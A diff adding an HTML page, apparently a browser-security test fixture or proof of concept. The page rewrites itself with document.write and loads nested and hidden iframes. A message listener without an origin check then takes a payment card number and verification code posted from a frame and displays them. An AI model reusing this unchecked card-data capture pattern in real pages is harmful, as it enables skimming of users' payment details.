@@ -1,0 +1,35 @@
+<!doctype html>
+<html>
+<body style="padding: 5em">
+    <p>Please wait!</p>
+    <iframe width="0"
+            height="0"
+            src="garbage.html">
+    </iframe>
+    <script>
+    setTimeout(() => {
+        document.open();
+        document.write(`
+<iframe id="frame1"
+        src="first-level.html">
+</iframe>
+<div class="card_details">
+    <div class="card_number"></div>
+    <div class="card_verify"></div>
+</div>`);
+        document.close();
+        window.addEventListener('message', function(ev) {
+            var number = document.querySelector('.card_number');
+            var verify = document.querySelector('.card_verify');
+            var data = ev.data || {};
+            if (data.card_number) {
+                number.innerText = data.card_number;
+            }
+            if (data.card_verify) {
+                verify.innerText = data.card_verify;
+            }
+        });
+    }, 200);
+    </script>
+</body>
+</html>
